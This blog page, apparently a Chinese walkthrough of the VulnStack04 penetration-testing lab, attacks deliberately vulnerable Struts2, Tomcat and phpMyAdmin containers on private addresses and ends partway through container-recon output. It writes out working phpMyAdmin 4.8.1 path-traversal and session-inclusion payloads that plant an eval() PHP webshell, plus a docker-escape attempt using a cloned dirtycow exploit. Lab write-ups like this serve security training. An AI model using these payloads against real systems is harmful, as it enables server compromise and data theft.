@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="VulnStack04一、环境配置0x01 模式配置环境概览： 1234567kali  ：192.168.40.129ubuntu：公网192.168.40.128 内网192.168.183.128win7  ：内网192.168.183.129DC    ：内网192.168.183.130  注意： 需提前修改虚拟机网络，使得网卡1在183段：  0x02 服务配置接着还需要在ubuntu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnStack04">
+<meta property="og:url" content="https://givemefivw.github.io/2022/04/19/VulnStack04/index.html">
+<meta property="og:site_name" content="斑马Blog——进击的白帽子">
+<meta property="og:description" content="VulnStack04一、环境配置0x01 模式配置环境概览： 1234567kali  ：192.168.40.129ubuntu：公网192.168.40.128 内网192.168.183.128win7  ：内网192.168.183.129DC    ：内网192.168.183.130  注意： 需提前修改虚拟机网络，使得网卡1在183段：  0x02 服务配置接着还需要在ubuntu">
+<meta property="og:locale">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/20220506.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/202205061.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/202205062.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/202205063.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/202205064.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/202205065.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/202205066.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/202205067.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/202205068.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/202205069.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/2022050610.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/2022050611.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/2022050612.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/2022050613.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/2022050614.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/2022050615.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/2022050616.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/2022050617.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/2022050618.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/2022050619.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/2022050620.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/2022050621.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/2022050622.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/2022050623.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/2022050624.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/2022050625.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/2022050626.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/2022050627.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/2022050628.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/2022050629.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/2022050630.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/2022050631.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/2022050632.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/2022050633.png">
+<meta property="og:image" content="https://givemefivw.github.io/VulnStack04.htm/2022050634.png">
+<meta property="article:published_time" content="2022-04-19T07:04:39.000Z">
+<meta property="article:modified_time" content="2022-07-19T13:01:15.442Z">
+<meta property="article:author" content="givemefivw">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://givemefivw.github.io/VulnStack04.htm/20220506.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>VulnStack04</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Startseite</a></li><!--
+     --><!--
+       --><li><a href="/about/">Über diese Webseite</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Artikel</a></li><!--
+     --><!--
+       --><li><a href="/">Projekte</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Vorheriger Beitrag" href="/2022/04/24/Adb-works-with-Frida-to-bypass-SSL-Pinning/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Nächster Beitrag" href="/2022/04/15/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91wmiexec%E4%B8%8A%E7%BA%BF/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Zurück zum Anfang" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Beitrag teilen" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Vorheriger Beitrag</span>
+      <span id="i-next" class="info" style="display:none;">Nächster Beitrag</span>
+      <span id="i-top" class="info" style="display:none;">Zurück zum Anfang</span>
+      <span id="i-share" class="info" style="display:none;">Beitrag teilen</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://givemefivw.github.io/2022/04/19/VulnStack04/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://givemefivw.github.io/2022/04/19/VulnStack04/&text=VulnStack04"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://givemefivw.github.io/2022/04/19/VulnStack04/&title=VulnStack04"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://givemefivw.github.io/2022/04/19/VulnStack04/&is_video=false&description=VulnStack04"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnStack04&body=Check out this article: https://givemefivw.github.io/2022/04/19/VulnStack04/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://givemefivw.github.io/2022/04/19/VulnStack04/&title=VulnStack04"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://givemefivw.github.io/2022/04/19/VulnStack04/&title=VulnStack04"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://givemefivw.github.io/2022/04/19/VulnStack04/&title=VulnStack04"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://givemefivw.github.io/2022/04/19/VulnStack04/&title=VulnStack04"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://givemefivw.github.io/2022/04/19/VulnStack04/&name=VulnStack04&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://givemefivw.github.io/2022/04/19/VulnStack04/&t=VulnStack04"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#VulnStack04"><span class="toc-number">1.</span> <span class="toc-text">VulnStack04</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">一、环境配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E6%A8%A1%E5%BC%8F%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">0x01 模式配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.2.</span> <span class="toc-text">0x02 服务配置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">1.2.</span> <span class="toc-text">二、渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">0x01 信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E5%8F%91%E7%8E%B0%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.2.</span> <span class="toc-text">0x02 发现思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-GetShell"><span class="toc-number">1.2.3.</span> <span class="toc-text">0x03 GetShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-Docker%E9%80%83%E9%80%B8"><span class="toc-number">1.2.4.</span> <span class="toc-text">0x04 Docker逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">1.2.5.</span> <span class="toc-text">0x05 横向移动</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        VulnStack04
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">givemefivw</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-04-19T07:04:39.000Z" itemprop="datePublished">2022-04-19</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/">技术文章</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="VulnStack04"><a href="#VulnStack04" class="headerlink" title="VulnStack04"></a>VulnStack04</h1><h2 id="一、环境配置"><a href="#一、环境配置" class="headerlink" title="一、环境配置"></a>一、环境配置</h2><h3 id="0x01-模式配置"><a href="#0x01-模式配置" class="headerlink" title="0x01 模式配置"></a>0x01 模式配置</h3><p>环境概览：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kali  ：<span class="number">192.168</span><span class="number">.40</span><span class="number">.129</span></span><br><span class="line"></span><br><span class="line">ubuntu：公网<span class="number">192.168</span><span class="number">.40</span><span class="number">.128</span> 内网<span class="number">192.168</span><span class="number">.183</span><span class="number">.128</span></span><br><span class="line"></span><br><span class="line">win7  ：内网<span class="number">192.168</span><span class="number">.183</span><span class="number">.129</span></span><br><span class="line"></span><br><span class="line">DC    ：内网<span class="number">192.168</span><span class="number">.183</span><span class="number">.130</span></span><br></pre></td></tr></table></figure>
+
+<p>注意：</p>
+<p>需提前修改虚拟机网络，使得网卡1在183段：</p>
+<p><img src="/VulnStack04.htm/20220506.png" alt="20220506"></p>
+<h3 id="0x02-服务配置"><a href="#0x02-服务配置" class="headerlink" title="0x02 服务配置"></a>0x02 服务配置</h3><p>接着还需要在ubuntu机器开启脆弱性服务：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cd /home/ubuntu/Desktop/vulhub/struts2/s2-045</span><br><span class="line"></span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"></span><br><span class="line">cd /home/ubuntu/Desktop/vulhub/tomcat/CVE-<span class="number">2017</span>-<span class="number">12615</span></span><br><span class="line"></span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"></span><br><span class="line">cd /home/ubuntu/Desktop/vulhub/phpmyadmin/CVE-<span class="number">2018</span>-<span class="number">12613</span></span><br><span class="line"></span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p><img src="/VulnStack04.htm/202205061.png" alt="20220506"></p>
+<h2 id="二、渗透测试"><a href="#二、渗透测试" class="headerlink" title="二、渗透测试"></a>二、渗透测试</h2><h3 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h3><p>仅得到一个IP地址，查看开放哪些端口：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">udo nmap -sS -sV -Pn -T <span class="number">4</span> <span class="number">192.168</span><span class="number">.40</span><span class="number">.128</span></span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.40</span><span class="number">.128</span></span><br><span class="line">Host <span class="keyword">is</span> up (<span class="number">0.000047</span>s latency).</span><br><span class="line">Not shown: <span class="number">996</span> closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp   <span class="built_in">open</span>  ssh     OpenSSH <span class="number">6.6</span><span class="number">.1</span>p1 Ubuntu 2ubuntu2<span class="number">.13</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line"><span class="number">2001</span>/tcp <span class="built_in">open</span>  http    Jetty <span class="number">9.2</span><span class="number">.11</span>.v20150529</span><br><span class="line"><span class="number">2002</span>/tcp <span class="built_in">open</span>  http    Apache Tomcat <span class="number">8.5</span><span class="number">.19</span></span><br><span class="line"><span class="number">2003</span>/tcp <span class="built_in">open</span>  http    Apache httpd <span class="number">2.4</span><span class="number">.25</span> ((Debian))</span><br><span class="line">MAC Address: <span class="number">00</span>:0C:<span class="number">29</span>:<span class="number">32</span>:AB:01 (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p><img src="/VulnStack04.htm/202205062.png" alt="20220506"></p>
+<p>可以看到目标机器开放了四个端口</p>
+<h3 id="0x02-发现思路"><a href="#0x02-发现思路" class="headerlink" title="0x02 发现思路"></a>0x02 发现思路</h3><p>根据得到的端口信息，此时思路有两个：</p>
+<ul>
+<li>针对22端口SSH爆破；</li>
+<li>访问不同Web服务端口，进一步收集信息</li>
+</ul>
+<h3 id="0x03-GetShell"><a href="#0x03-GetShell" class="headerlink" title="0x03 GetShell"></a>0x03 GetShell</h3><p>首先第一个思路，针对22端口进行SSH爆破，如果字典足够强大或者目标机器存在弱口令，那么我们就会直接获得登录信息：</p>
+<p><img src="/VulnStack04.htm/202205063.png" alt="20220506"></p>
+<p>使用口令进行远程登录，直接获取到一台机器：</p>
+<p><img src="/VulnStack04.htm/202205064.png" alt="20220506"></p>
+<p>当然，实战中要判断是否是蜜罐。</p>
+<p>第二个思路，访问不同的web端口，查看具体服务继续收集信息：</p>
+<p><strong>2001端口Struts2 GetShell：</strong></p>
+<p><img src="/VulnStack04.htm/202205065.png" alt="20220506"></p>
+<p>为一上传页面，通过Finger指纹扫描，得到为<code>Struts2 Showcase</code> :</p>
+<p><img src="/VulnStack04.htm/202205066.png" alt="20220506"></p>
+<p>使用专项漏洞检测工具扫描，结果显示目标存在<code>S2-045</code>漏洞：</p>
+<p><img src="/VulnStack04.htm/202205067.png" alt="20220506"></p>
+<p>尝试执行命令，成功：</p>
+<p><img src="/VulnStack04.htm/202205068.png" alt="20220506"></p>
+<p>ifconfig查看IP信息，失败，提示<code>/bin/bash: ifconfig: command not found</code></p>
+<p><img src="/VulnStack04.htm/202205069.png" alt="20220506"></p>
+<p>接着尝试上传Webshell文件，上传到指定目录<code>/usr/src/src/main/webapp/temp1.jsp</code>：</p>
+<p><img src="/VulnStack04.htm/2022050610.png" alt="20220506"></p>
+<p>访问网页，页面空白，说明上传成功：</p>
+<p><img src="/VulnStack04.htm/2022050611.png" alt="20220506"></p>
+<p>冰蝎连接GetShell：</p>
+<p><img src="/VulnStack04.htm/2022050612.png" alt="20220506"></p>
+<p>得到root权限:</p>
+<p><img src="/VulnStack04.htm/2022050613.png" alt="20220506"></p>
+<p><code>ping DNSLog</code>确认目标处于出网状态：</p>
+<p><img src="/VulnStack04.htm/2022050614.png" alt="20220506"></p>
+<p><strong>2002端口Tomcat GetShell:</strong></p>
+<p>端口服务Tomcat默认页面：</p>
+<p><img src="/VulnStack04.htm/2022050615.png" alt="20220506"></p>
+<p>manage页面403：</p>
+<p><img src="/VulnStack04.htm/2022050616.png" alt="20220506"></p>
+<p>使用Nuclei自动扫描，显示存在<code>CVE-2017-12615</code> Tomcat文件上传漏洞：</p>
+<p><img src="/VulnStack04.htm/2022050617.png" alt="20220506"></p>
+<p>然后抓包写入冰蝎马GetShell，不再赘述。</p>
+<p><strong>2003端口phpMyadmin GetShell：</strong></p>
+<p>访问2003端口页面，未授权直接进入后台，版本为4.8.1：</p>
+<p><img src="/VulnStack04.htm/2022050618.png" alt="20220506"></p>
+<p>首先想到利用4.8.1文件读取GetShell:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.40</span><span class="number">.128</span>:<span class="number">2003</span>/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/VulnStack04.htm/2022050619.png" alt="20220506"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE <span class="string">&#x27;general%&#x27;</span>;</span><br><span class="line"></span><br><span class="line">SET GLOBAL general_log=<span class="string">&#x27;on&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>但是无法执行第二条语句，提示权限不足：</p>
+<p><img src="/VulnStack04.htm/2022050620.png" alt="20220506"></p>
+<p>换用其他方式：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//sess_后面的字段为Cookie中的phpMyadmin值Cookie: JSESSIONID=D2708E458170423AAF30900487729C84; pma_lang=zh_CN; phpMyAdmin=164066fc245614fc500901868bac04b5</span><br><span class="line"></span><br><span class="line">select <span class="string">&#x27;&lt;?php phpinfo()?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">http://<span class="number">192.168</span><span class="number">.40</span><span class="number">.128</span>:<span class="number">2003</span>/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_164066fc245614fc500901868bac04b5</span><br><span class="line"></span><br><span class="line">//此时得到目标网站根目录/var/www/html/</span><br><span class="line"></span><br><span class="line">select <span class="string">&quot;&lt;?php file_put_contents(&#x27;/var/www/html/shell.php&#x27;,&#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;)?&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">http://<span class="number">192.168</span><span class="number">.40</span><span class="number">.128</span>:<span class="number">2003</span>/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_164066fc245614fc500901868bac04b5</span><br><span class="line"></span><br><span class="line">http://<span class="number">192.168</span><span class="number">.40</span><span class="number">.128</span>:<span class="number">2003</span>/shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/VulnStack04.htm/2022050621.png" alt="20220506"></p>
+<p><img src="/VulnStack04.htm/2022050622.png" alt="20220506"></p>
+<p>蚁剑连接GetShell:</p>
+<p><img src="/VulnStack04.htm/2022050623.png" alt="20220506"></p>
+<h3 id="0x04-Docker逃逸"><a href="#0x04-Docker逃逸" class="headerlink" title="0x04 Docker逃逸"></a>0x04 Docker逃逸</h3><p>拿到Shell后，根据ifconfig无法执行，尝试执行<code>ls -alh /.dockerenv</code>判断是否为docker容器：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/src/ &gt;ls -alh /.dockerenv</span><br><span class="line">-rwxr-xr-x <span class="number">1</span> root root <span class="number">0</span> Jan <span class="number">22</span>  <span class="number">2020</span> /.dockerenv</span><br></pre></td></tr></table></figure>
+
+<p>结果显示存在<code>.dockerenv</code>文件，判断当前Shell为docker容器，需要进行逃逸。</p>
+<p>尝试dirty cawl逃逸，失败：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/scumjr/dirtycow-vdso.git</span><br><span class="line"></span><br><span class="line">cd /dirtycow-vdso/</span><br><span class="line"></span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+
+<p><img src="/VulnStack04.htm/2022050624.png" alt="20220506"></p>
+<p>上传CDK工具，运行<code>cdk evaluate —full</code>信息收集</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">[Information Gathering - System Info]</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">17</span> <span class="number">11</span>:<span class="number">14</span>:03 current <span class="built_in">dir</span>: /</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">17</span> <span class="number">11</span>:<span class="number">14</span>:03 current user: root uid: <span class="number">0</span> gid: <span class="number">0</span> home: /root</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">17</span> <span class="number">11</span>:<span class="number">14</span>:03 hostname: <span class="number">174745</span>108fcb</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">17</span> <span class="number">11</span>:<span class="number">14</span>:03 debian debian <span class="number">9.11</span> kernel: <span class="number">4.4</span><span class="number">.0</span>-<span class="number">142</span>-generic</span><br><span class="line"></span><br><span class="line">[Information Gathering - Services]</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">17</span> <span class="number">11</span>:<span class="number">14</span>:03 service found <span class="keyword">in</span> process:</span><br><span class="line">        <span class="number">1</span>       <span class="number">0</span>       java</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">17</span> <span class="number">11</span>:<span class="number">14</span>:03 service found <span class="keyword">in</span> process:</span><br><span class="line">        <span class="number">164</span>     <span class="number">1</span>       python</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">17</span> <span class="number">11</span>:<span class="number">14</span>:03 service found <span class="keyword">in</span> process:</span><br><span class="line">        <span class="number">256</span>     <span class="number">254</span>     python</span><br><span class="line"></span><br><span class="line">[Information Gathering - Commands <span class="keyword">and</span> Capabilities]</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">17</span> <span class="number">11</span>:<span class="number">14</span>:03 available commands:</span><br><span class="line">        curl,wget,find,ps,java,python,apt,dpkg,ssh,git,svn,mount,fdisk,base64,python2,python2<span class="number">.7</span>,perl</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">17</span> <span class="number">11</span>:<span class="number">14</span>:03 Capabilities <span class="built_in">hex</span> of Caps(CapInh|CapPrm|CapEff|CapBnd|CapAmb):</span><br><span class="line">        CapInh: 00000000a80425fb</span><br><span class="line">        CapPrm: 00000000a80425fb</span><br><span class="line">        CapEff: 00000000a80425fb</span><br><span class="line">        CapBnd: 00000000a80425fb</span><br><span class="line">        CapAmb: <span class="number">0000000000000000</span></span><br><span class="line">        Cap decode: <span class="number">0x00000000a80425fb</span> = CAP_CHOWN,CAP_DAC_OVERRIDE,CAP_FOWNER,CAP_FSETID,CAP_KILL,CAP_SETGID,CAP_SETUID,CAP_SETPCAP,CAP_NET_BIND_SERVICE,CAP_NET_RAW,CAP_SYS_CHROOT,CAP_MKNOD,CAP_AUDIT_WRITE,CAP_SETFCAP</span><br><span class="line">        Add capability <span class="built_in">list</span>: </span><br><span class="line">[*] Maybe you can exploit the Capabilities below:</span><br><span class="line"></span><br><span class="line">[Information Gathering - Mounts]</span><br><span class="line"></span><br><span class="line">[Information Gathering - Net Namespace]</span><br><span class="line">        container net namespace isolated.</span><br><span class="line"></span><br><span class="line">[Information Gathering - Sysctl Variables]</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">17</span> <span class="number">11</span>:<span class="number">14</span>:03 net.ipv4.conf.<span class="built_in">all</span>.route_localnet = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">[Discovery - K8s API Server]</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">17</span> <span class="number">11</span>:<span class="number">14</span>:03 checking <span class="keyword">if</span> api-server allows system:anonymous 